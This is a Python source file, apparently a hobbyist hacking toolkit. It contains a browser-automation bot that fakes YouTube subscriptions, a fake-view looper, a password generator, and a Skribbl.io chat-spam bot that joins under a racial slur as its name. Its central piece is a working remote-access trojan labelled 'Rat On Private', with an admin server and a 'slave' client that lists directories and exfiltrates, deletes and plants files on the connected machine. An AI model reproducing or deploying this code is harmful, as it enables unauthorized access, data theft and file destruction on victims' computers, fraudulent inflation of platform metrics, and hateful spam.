from config import *
from vars import *
from tor import *
#YT Bot

def ytbot():
    class SubBot:
        subButton = 'var SubForLogin = document.getElementsByClassName("style-scope ytd-subscribe-button-renderer");'
        subButtonClick = "SubForLogin[1].click();"
        bellButton = 'var Bell = document.getElementsByClassName("style-scope ytd-toggle-button-renderer");'
        bellButtonClick = "Bell[1].click();"


        url = input("Channel Link >> ")


        listOfBrowser = ['start chrome ' + url, 'start firefox ' + url]


        listOfCommand = ['j', 'i']


        waitTime = 1
        flag = True
        count = 0


        def is_connected(self):
            try:
                socket.create_connection(("www.google.com", 80))
                return True
            except OSError:
                pass
            return False


        def enter(self, val):
            time.sleep(self.waitTime)
            pyautogui.press('enter')


        def main(self):

            while self.flag:


                time.sleep(self.waitTime + 4)


                if self.is_connected() == True:

                    for i in self.listOfBrowser:

                        start_new_thread(self.enter, (1,))


                        process = subprocess.Popen(i, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                        process.communicate()


                        if process.returncode == 1:

                            self.count = self.count + 1
                            if self.count == len(self.listOfBrowser):
                                self.flag = False;
                            continue


                        time.sleep(self.waitTime + 4)


                        pyautogui.hotkey('ctrl', 'shift', self.listOfCommand[self.listOfBrowser.index(i)])


                        time.sleep(self.waitTime + 2)
                        pyautogui.typewrite(self.subButton)
                        pyautogui.press('enter')
                        time.sleep(self.waitTime)
                        pyautogui.typewrite(self.subButtonClick)
                        pyautogui.press('enter')
                        time.sleep(self.waitTime)
                        pyautogui.typewrite(self.bellButton)
                        pyautogui.press('enter')
                        time.sleep(self.waitTime)
                        pyautogui.typewrite(self.bellButtonClick)
                        pyautogui.press('enter')
                        time.sleep(self.waitTime)


                        pyautogui.hotkey('alt', 'f4')


                        pyautogui.press('enter')


                        self.flag = False;
                        break
                else:

                    print("Please Connect to Internet")

    subBot = SubBot()
    subBot.main()

# end


#Password Generator
def passgen():
    pw = ""
    zeichen = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-_"
    länge = int(input("    Passwort länge >> "))
    for _ in range(länge):
        pw = pw + secrets.choice(zeichen)
    outfile = open("passgen.txt", "a")
    Account = input("   Für Was ist Der Account (Name) >> ")
    outfile.write(Account + "\n")
    outfile.write("Your Password is >> " + str(pw) + "\n")
    outfile.close()

# End

#Skribbl IO Bot

def skribblbot():
    counter = 0
    type = input("      Enter Text for Chat! >> ")
    while counter < 100:
        path = "C:\Program Files (x86)\chromedriver.exe"
        driver = wb.Chrome(path)

        time.sleep(2)
        driver.get("https://skribbl.io/")
        print("")
        print("Loaded Skribbl.io")
        counter += 1
        print("")
        print(counter)
        time.sleep(2)
        link = driver.find_element_by_link_text("Alle akzeptieren")
        link.click()
        entername = driver.find_element_by_class_name("form-control")
        time.sleep(1)
        entername.send_keys("BurnNiggers")
        entername.send_keys(Keys.RETURN)
        time.sleep(1.9)
        inputchat = driver.find_element_by_id("inputChat")
        time.sleep(0.3)
        inputchat.click()
        inputchat.send_keys(type)
        inputchat.send_keys(Keys.RETURN)
        time.sleep(1.8)
        inputchat = driver.find_element_by_id("inputChat")
        inputchat.click()
        inputchat.send_keys(type)
        inputchat.send_keys(Keys.RETURN)
        time.sleep(1.8)
        inputchat = driver.find_element_by_id("inputChat")
        inputchat.click()
        inputchat.send_keys(type)
        inputchat.send_keys(Keys.RETURN)
        time.sleep(1.8)
        inputchat = driver.find_element_by_id("inputChat")
        inputchat.click()
        inputchat.send_keys(type)
        inputchat.send_keys(Keys.RETURN)
        time.sleep(1)
        driver.close()

# End

#Rat On Private
def backdoor():
    question = input("      Admin or Guest ? >>")
    question1 = input("     Help?")
    if question1 == "yes":
        print("dir - show files in directory where the file is running")
        print("cd - Go in Custom Directorys")
        print("dw - Download Files")
        print("rm - removes file")
        print("sendfile - Send A file to a slave")

    if question1 == "no":
        print("     Dumb bitch!")
        print("")

    if question == "admin":
        s = socket.socket()
        host = socket.gethostname()
        port = 8080
        s.bind((host, port))
        print("")
        print("     ~ Server is Running at", host)
        print("")
        print("     ~ Waiting for Connections...")
        s.listen(1)
        conn, addr = s.accept()
        print("")
        print("     ~ ", addr, "Has Connected to the Server !")
        while (1):
            command = input(str(" Command >> "))
            if (command == "dir"):
                conn.send(command.encode())
                print("")
                print("     ~ wait... ")
                print("")
                files = conn.recv(5000)
                files = files.decode()
                print("     output:", files)

            elif (command == "cd"):
                conn.send(command.encode())
                print("")
                user_input = input(str("    Path >>  "))
                conn.send(user_input.encode())
                print("")
                print("     ~ wait...")
                print("")
                files = conn.recv(5000)
                files = files.decode()
                print("     ~~~Output : ", files)


            elif (command == "dw"):
                conn.send(command.encode())
                filepath = input(str("      File Path>> "))
                conn.send(filepath.encode())
                file = conn.recv(5000)
                filename = input("      FileName including ext >> ")
                newfile = open(filename, "wb")
                newfile.write(file)
                newfile.close()
                print("")
                print("     ~ ", filename, "has been downloaded!")
                print("")


            elif command == "rm":
                conn.send(command.encode())
                fileanddir = input(str("        Enter Filename and Dir >> "))
                print("     ~ wait..")
                conn.send(fileanddir.encode())
                print("")
                print("     ~ Removed!")


            elif command == "sendfile":
                file = input(str("      Enter Filename and Dir >> "))
                filename = input(str("      Enter Name For being sent >> "))
                data = open(file, "rb")
                file_data = data.read(7000)
                conn.send(file_data)
                print("     ~ ", file, "Has Been sent!")
                conn.send(filename.encode())





            else:
                print("     ~ failed Try again..")


    elif question == "guest":
        s = socket.socket()
        port = 8080
        host = input(str("      Enter server address :  "))
        s.connect((host, port))
        print("     ~ connected to the server")
        print("")

        while 1:
            command = s.recv(1024)
            command = command.decode()
            print("")
            print("     ~ Command Recived")
            if (command == "dir"):
                files = os.getcwd()
                files = str(files)
                s.send(files.encode())
                print("")
                print("     ~ Executed!")

            elif command == "cd":
                user_input = s.recv(5000)
                user_input = user_input.decode()
                files = os.listdir(user_input)
                files = str(files)
                s.send(files.encode())
                print("     ~ Command Running..")

            elif command == "dw":
                file_path = s.recv(5000)
                file_path = file_path.decode()
                file = open(file_path, "rb")
                data = file.read()
                s.send(data.encode())
                print("")
                print("     ~ File has Benn Sent!")

            elif command == "rm":
                fileanddir = s.recv(6000)
                fileanddir = fileanddir.decode()
                os.remove(fileanddir)
                print("     ~ Removed!")
                print("")

            elif command == "sendfile":
                filename = s.recv(6000)
                newfile = open(filename, "wb")
                data = s.recv(6000)
                newfile.write(data)
                newfile.close()

            else:
                print("     ~ failed Try again..")


def ytviewbot():
    timer = 30
    views = int(input("How many Viewers? >> "))
    counter = 0
    ytlink = input("YouTube Link >> ")
    while counter < 100:
        os.system("TASKKILL /F /IM chrome.exe")
        os.system("start chrome " + ytlink)

        time.sleep(timer)
        counter += 1
        print("Views Below : ")
        print(views)
        print("")
        print("Counter Below : ")
        print(counter)

        if views == counter:
            sys.exit()
